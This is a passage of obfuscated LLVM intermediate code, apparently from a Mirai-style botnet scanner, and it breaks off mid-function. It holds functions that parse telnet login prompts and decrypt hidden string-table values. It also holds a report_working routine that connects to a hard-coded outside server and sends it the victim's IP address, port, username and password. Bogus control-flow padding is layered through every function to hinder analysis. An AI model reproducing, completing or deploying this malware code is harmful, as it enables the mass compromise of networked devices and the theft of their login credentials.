  br i1 %123, label %originalBBpart227, label %originalBB10alteredBB

originalBBpart227:                                ; preds = %originalBB10
  br label %14

; <label>:124:                                    ; preds = %originalBBpart28, %14
  %125 = load i32, i32* %6, align 4
  %126 = icmp eq i32 %125, -1
  br i1 %126, label %127, label %160

; <label>:127:                                    ; preds = %124
  call void @table_unlock_val(i8 zeroext 25)
  %128 = call i8* @table_retrieve_val(i32 25, i32* %9)
  store i8* %128, i8** %7, align 8
  %129 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %130 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %129, i32 0, i32 7
  %131 = getelementptr inbounds [256 x i8], [256 x i8]* %130, i32 0, i32 0
  %132 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %133 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %132, i32 0, i32 6
  %134 = load i32, i32* %133, align 4
  %135 = load i8*, i8** %7, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sub nsw i32 %136, 1
  %138 = call i32 @util_memsearch(i8* %131, i32 %134, i8* %135, i32 %137)
  %139 = icmp ne i32 %138, -1
  %140 = zext i1 %139 to i32
  store i32 %140, i32* %8, align 4
  br i1 %139, label %141, label %159

; <label>:141:                                    ; preds = %127
  %142 = load i32, i32* @x.69
  %143 = load i32, i32* @y.70
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %141
  %150 = load i32, i32* %8, align 4
  store i32 %150, i32* %6, align 4
  %151 = load i32, i32* @x.69
  %152 = load i32, i32* @y.70
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %159

; <label>:159:                                    ; preds = %originalBBpart231, %127
  br label %160

; <label>:160:                                    ; preds = %159, %124
  call void @table_lock_val(i8 zeroext 25)
  %161 = load i32, i32* %6, align 4
  %162 = icmp eq i32 %161, -1
  br i1 %162, label %163, label %164

; <label>:163:                                    ; preds = %160
  store i32 0, i32* %2, align 4
  br label %166

; <label>:164:                                    ; preds = %160
  %165 = load i32, i32* %6, align 4
  store i32 %165, i32* %2, align 4
  br label %166

; <label>:166:                                    ; preds = %164, %163
  %167 = load i32, i32* %2, align 4
  ret i32 %167

originalBBalteredBB:                              ; preds = %originalBB, %26
  %168 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %169 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %168, i32 0, i32 7
  %170 = load i32, i32* %5, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds [256 x i8], [256 x i8]* %169, i64 0, i64 %171
  %173 = load i8, i8* %172, align 1
  %174 = sext i8 %173 to i32
  %175 = icmp eq i32 %174, 62
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  %176 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %177 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %176, i32 0, i32 7
  %178 = load i32, i32* %5, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds [256 x i8], [256 x i8]* %177, i64 0, i64 %179
  %181 = load i8, i8* %180, align 1
  %182 = sext i8 %181 to i32
  %183 = icmp eq i32 %182, 35
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %85
  %184 = load i32, i32* %5, align 4
  %_ = sub i32 0, %184
  %gen = add i32 %_, 1
  %185 = add nsw i32 %184, 1
  store i32 %185, i32* %6, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %105
  %186 = load i32, i32* %5, align 4
  %_11 = sub i32 0, %186
  %gen12 = add i32 %_11, -1
  %_13 = sub i32 %186, -1
  %gen14 = mul i32 %_13, -1
  %_15 = shl i32 %186, -1
  %_16 = sub i32 %186, -1
  %gen17 = mul i32 %_16, -1
  %_18 = shl i32 %186, -1
  %_19 = sub i32 %186, -1
  %gen20 = mul i32 %_19, -1
  %_21 = sub i32 0, %186
  %gen22 = add i32 %_21, -1
  %_23 = sub i32 0, %186
  %gen24 = add i32 %_23, -1
  %_25 = shl i32 %186, -1
  %187 = add nsw i32 %186, -1
  store i32 %187, i32* %5, align 4
  br label %originalBB10

originalBB29alteredBB:                            ; preds = %originalBB29, %141
  %188 = load i32, i32* %8, align 4
  store i32 %188, i32* %6, align 4
  br label %originalBB29
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.71
  %3 = load i32, i32* @y.72
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.scanner_connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %11, align 8
  store i32 -1, i32* %14, align 4
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 6
  %17 = load i32, i32* %16, align 4
  %18 = sub nsw i32 %17, 1
  store i32 %18, i32* %13, align 4
  %19 = load i32, i32* @x.71
  %20 = load i32, i32* @y.72
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %95, %originalBBpart2
  %28 = load i32, i32* %13, align 4
  %29 = icmp sgt i32 %28, 0
  br i1 %29, label %30, label %98

; <label>:30:                                     ; preds = %27
  %31 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %32 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %31, i32 0, i32 7
  %33 = load i32, i32* %13, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [256 x i8], [256 x i8]* %32, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = sext i8 %36 to i32
  %38 = icmp eq i32 %37, 58
  br i1 %38, label %75, label %39

; <label>:39:                                     ; preds = %30
  %40 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %41 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %40, i32 0, i32 7
  %42 = load i32, i32* %13, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i64 0, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = sext i8 %45 to i32
  %47 = icmp eq i32 %46, 62
  br i1 %47, label %75, label %48

; <label>:48:                                     ; preds = %39
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 7
  %51 = load i32, i32* %13, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [256 x i8], [256 x i8]* %50, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = icmp eq i32 %55, 36
  br i1 %56, label %75, label %57

; <label>:57:                                     ; preds = %48
  %58 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %59 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %58, i32 0, i32 7
  %60 = load i32, i32* %13, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [256 x i8], [256 x i8]* %59, i64 0, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 35
  br i1 %65, label %75, label %66

; <label>:66:                                     ; preds = %57
  %67 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %68 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %67, i32 0, i32 7
  %69 = load i32, i32* %13, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [256 x i8], [256 x i8]* %68, i64 0, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 37
  br i1 %74, label %75, label %94

; <label>:75:                                     ; preds = %66, %57, %48, %39, %30
  %76 = load i32, i32* @x.71
  %77 = load i32, i32* @y.72
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %75
  %84 = load i32, i32* %13, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %14, align 4
  %86 = load i32, i32* @x.71
  %87 = load i32, i32* @y.72
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart219, label %originalBB11alteredBB

originalBBpart219:                                ; preds = %originalBB11
  br label %98

; <label>:94:                                     ; preds = %66
  br label %95

; <label>:95:                                     ; preds = %94
  %96 = load i32, i32* %13, align 4
  %97 = add nsw i32 %96, -1
  store i32 %97, i32* %13, align 4
  br label %27

; <label>:98:                                     ; preds = %originalBBpart219, %27
  %99 = load i32, i32* %14, align 4
  %100 = icmp eq i32 %99, -1
  br i1 %100, label %101, label %102

; <label>:101:                                    ; preds = %98
  store i32 0, i32* %10, align 4
  br label %120

; <label>:102:                                    ; preds = %98
  %103 = load i32, i32* @x.71
  %104 = load i32, i32* @y.72
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %102
  %111 = load i32, i32* %14, align 4
  store i32 %111, i32* %10, align 4
  %112 = load i32, i32* @x.71
  %113 = load i32, i32* @y.72
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %120

; <label>:120:                                    ; preds = %originalBBpart223, %101
  %121 = load i32, i32* %10, align 4
  ret i32 %121

originalBBalteredBB:                              ; preds = %originalBB, %1
  %122 = alloca i32, align 4
  %123 = alloca %struct.scanner_connection*, align 8
  %124 = alloca i8*, align 8
  %125 = alloca i32, align 4
  %126 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %123, align 8
  store i32 -1, i32* %126, align 4
  %127 = load %struct.scanner_connection*, %struct.scanner_connection** %123, align 8
  %128 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %127, i32 0, i32 6
  %129 = load i32, i32* %128, align 4
  %_ = sub i32 %129, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 0, %129
  %gen2 = add i32 %_1, 1
  %_3 = sub i32 0, %129
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 0, %129
  %gen6 = add i32 %_5, 1
  %_7 = sub i32 0, %129
  %gen8 = add i32 %_7, 1
  %_9 = sub i32 0, %129
  %gen10 = add i32 %_9, 1
  %130 = sub nsw i32 %129, 1
  store i32 %130, i32* %125, align 4
  br label %originalBB

originalBB11alteredBB:                            ; preds = %originalBB11, %75
  %131 = load i32, i32* %13, align 4
  %_12 = sub i32 %131, 1
  %gen13 = mul i32 %_12, 1
  %_14 = sub i32 %131, 1
  %gen15 = mul i32 %_14, 1
  %_16 = sub i32 %131, 1
  %gen17 = mul i32 %_16, 1
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %14, align 4
  br label %originalBB11

originalBB21alteredBB:                            ; preds = %originalBB21, %102
  %133 = load i32, i32* %14, align 4
  store i32 %133, i32* %10, align 4
  br label %originalBB21
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.73
  %3 = load i32, i32* @y.74
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.scanner_connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %11, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %15 = call i8* @table_retrieve_val(i32 10, i32* %14)
  store i8* %15, i8** %12, align 8
  %16 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %17 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %16, i32 0, i32 7
  %18 = getelementptr inbounds [256 x i8], [256 x i8]* %17, i32 0, i32 0
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 6
  %21 = load i32, i32* %20, align 4
  %22 = load i8*, i8** %12, align 8
  %23 = load i32, i32* %14, align 4
  %24 = sub nsw i32 %23, 1
  %25 = call i32 @util_memsearch(i8* %18, i32 %21, i8* %22, i32 %24)
  %26 = icmp ne i32 %25, -1
  %27 = load i32, i32* @x.73
  %28 = load i32, i32* @y.74
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %36

; <label>:35:                                     ; preds = %originalBBpart2
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %10, align 4
  br label %69

; <label>:36:                                     ; preds = %originalBBpart2
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %37 = call i8* @table_retrieve_val(i32 9, i32* %14)
  store i8* %37, i8** %12, align 8
  %38 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %39 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %38, i32 0, i32 7
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %39, i32 0, i32 0
  %41 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %42 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %41, i32 0, i32 6
  %43 = load i32, i32* %42, align 4
  %44 = load i8*, i8** %12, align 8
  %45 = load i32, i32* %14, align 4
  %46 = sub nsw i32 %45, 1
  %47 = call i32 @util_memsearch(i8* %40, i32 %43, i8* %44, i32 %46)
  store i32 %47, i32* %13, align 4
  call void @table_lock_val(i8 zeroext 9)
  %48 = load i32, i32* %13, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %67

; <label>:50:                                     ; preds = %36
  %51 = load i32, i32* @x.73
  %52 = load i32, i32* @y.74
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  store i32 0, i32* %10, align 4
  %59 = load i32, i32* @x.73
  %60 = load i32, i32* @y.74
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %69

; <label>:67:                                     ; preds = %36
  %68 = load i32, i32* %13, align 4
  store i32 %68, i32* %10, align 4
  br label %69

; <label>:69:                                     ; preds = %67, %originalBBpart24, %35
  %70 = load i32, i32* %10, align 4
  ret i32 %70

originalBBalteredBB:                              ; preds = %originalBB, %1
  %71 = alloca i32, align 4
  %72 = alloca %struct.scanner_connection*, align 8
  %73 = alloca i8*, align 8
  %74 = alloca i32, align 4
  %75 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %72, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %76 = call i8* @table_retrieve_val(i32 10, i32* %75)
  store i8* %76, i8** %73, align 8
  %77 = load %struct.scanner_connection*, %struct.scanner_connection** %72, align 8
  %78 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %77, i32 0, i32 7
  %79 = getelementptr inbounds [256 x i8], [256 x i8]* %78, i32 0, i32 0
  %80 = load %struct.scanner_connection*, %struct.scanner_connection** %72, align 8
  %81 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %80, i32 0, i32 6
  %82 = load i32, i32* %81, align 4
  %83 = load i8*, i8** %73, align 8
  %84 = load i32, i32* %75, align 4
  %85 = sub nsw i32 %84, 1
  %86 = call i32 @util_memsearch(i8* %79, i32 %82, i8* %83, i32 %85)
  %87 = icmp ne i32 %86, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  store i32 0, i32* %10, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i16 zeroext, %struct.scanner_auth*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #6
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %18, label %15

; <label>:15:                                     ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %35

; <label>:18:                                     ; preds = %15, %3
  %19 = load i32, i32* @x.75
  %20 = load i32, i32* @y.76
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* @x.75
  %28 = load i32, i32* @y.76
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

; <label>:35:                                     ; preds = %15
  %36 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %36, i32* %9, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %55

; <label>:38:                                     ; preds = %35
  %39 = load i32, i32* @x.75
  %40 = load i32, i32* @y.76
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  call void @exit(i32 0) #8
  %47 = load i32, i32* @x.75
  %48 = load i32, i32* @y.76
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:55:                                     ; preds = %35
  %56 = load i32, i32* @x.75
  %57 = load i32, i32* @y.76
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %55
  call void @table_unlock_val(i8 zeroext 2)
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %64, align 4
  %65 = call i32 @inet_addr(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i32 0, i32 0)) #6
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %67 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %66, i32 0, i32 0
  store i32 %65, i32* %67, align 4
  %68 = call i8* @table_retrieve_val(i32 2, i32* null)
  %69 = bitcast i8* %68 to i16*
  %70 = load i16, i16* %69, align 2
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %70, i16* %71, align 2
  call void @table_lock_val(i8 zeroext 2)
  %72 = load i32, i32* %9, align 4
  %73 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %74 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %74, %struct.sockaddr** %73, align 8
  %75 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %76 = load %struct.sockaddr*, %struct.sockaddr** %75, align 8
  %77 = call i32 @connect(i32 %72, %struct.sockaddr* %76, i32 16)
  %78 = icmp eq i32 %77, -1
  %79 = load i32, i32* @x.75
  %80 = load i32, i32* @y.76
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %78, label %87, label %90

; <label>:87:                                     ; preds = %originalBBpart28
  %88 = load i32, i32* %9, align 4
  %89 = call i32 @close(i32 %88)
  call void @exit(i32 0) #8
  unreachable

; <label>:90:                                     ; preds = %originalBBpart28
  %91 = load i32, i32* @x.75
  %92 = load i32, i32* @y.76
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %90
  store i8 0, i8* %11, align 1
  %99 = load i32, i32* %9, align 4
  %100 = call i64 @send(i32 %99, i8* %11, i64 1, i32 16384)
  %101 = load i32, i32* %9, align 4
  %102 = bitcast i32* %4 to i8*
  %103 = call i64 @send(i32 %101, i8* %102, i64 4, i32 16384)
  %104 = load i32, i32* %9, align 4
  %105 = bitcast i16* %5 to i8*
  %106 = call i64 @send(i32 %104, i8* %105, i64 2, i32 16384)
  %107 = load i32, i32* %9, align 4
  %108 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %109 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %108, i32 0, i32 4
  %110 = call i64 @send(i32 %107, i8* %109, i64 1, i32 16384)
  %111 = load i32, i32* %9, align 4
  %112 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %113 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %112, i32 0, i32 0
  %114 = load i8*, i8** %113, align 8
  %115 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %116 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %115, i32 0, i32 4
  %117 = load i8, i8* %116, align 4
  %118 = zext i8 %117 to i64
  %119 = call i64 @send(i32 %111, i8* %114, i64 %118, i32 16384)
  %120 = load i32, i32* %9, align 4
  %121 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %122 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %121, i32 0, i32 5
  %123 = call i64 @send(i32 %120, i8* %122, i64 1, i32 16384)
  %124 = load i32, i32* %9, align 4
  %125 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %126 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %125, i32 0, i32 1
  %127 = load i8*, i8** %126, align 8
  %128 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %129 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %128, i32 0, i32 5
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i64
  %132 = call i64 @send(i32 %124, i8* %127, i64 %131, i32 16384)
  %133 = load i32, i32* %9, align 4
  %134 = call i32 @close(i32 %133)
  call void @exit(i32 0) #8
  %135 = load i32, i32* @x.75
  %136 = load i32, i32* @y.76
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %18
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  call void @exit(i32 0) #8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %55
  call void @table_unlock_val(i8 zeroext 2)
  %143 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %143, align 4
  %144 = call i32 @inet_addr(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i32 0, i32 0)) #6
  %145 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %146 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %145, i32 0, i32 0
  store i32 %144, i32* %146, align 4
  %147 = call i8* @table_retrieve_val(i32 2, i32* null)
  %148 = bitcast i8* %147 to i16*
  %149 = load i16, i16* %148, align 2
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %149, i16* %150, align 2
  call void @table_lock_val(i8 zeroext 2)
  %151 = load i32, i32* %9, align 4
  %152 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %153 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %153, %struct.sockaddr** %152, align 8
  %154 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %155 = load %struct.sockaddr*, %struct.sockaddr** %154, align 8
  %156 = call i32 @connect(i32 %151, %struct.sockaddr* %155, i32 16)
  %157 = icmp eq i32 %156, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %90
  store i8 0, i8* %11, align 1
  %158 = load i32, i32* %9, align 4
  %159 = call i64 @send(i32 %158, i8* %11, i64 1, i32 16384)
  %160 = load i32, i32* %9, align 4
  %161 = bitcast i32* %4 to i8*
  %162 = call i64 @send(i32 %160, i8* %161, i64 4, i32 16384)
  %163 = load i32, i32* %9, align 4
  %164 = bitcast i16* %5 to i8*
  %165 = call i64 @send(i32 %163, i8* %164, i64 2, i32 16384)
  %166 = load i32, i32* %9, align 4
  %167 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %168 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %167, i32 0, i32 4
  %169 = call i64 @send(i32 %166, i8* %168, i64 1, i32 16384)
  %170 = load i32, i32* %9, align 4
  %171 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %172 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %171, i32 0, i32 0
  %173 = load i8*, i8** %172, align 8
  %174 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %175 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %174, i32 0, i32 4
  %176 = load i8, i8* %175, align 4
  %177 = zext i8 %176 to i64
  %178 = call i64 @send(i32 %170, i8* %173, i64 %177, i32 16384)
  %179 = load i32, i32* %9, align 4
  %180 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %181 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %180, i32 0, i32 5
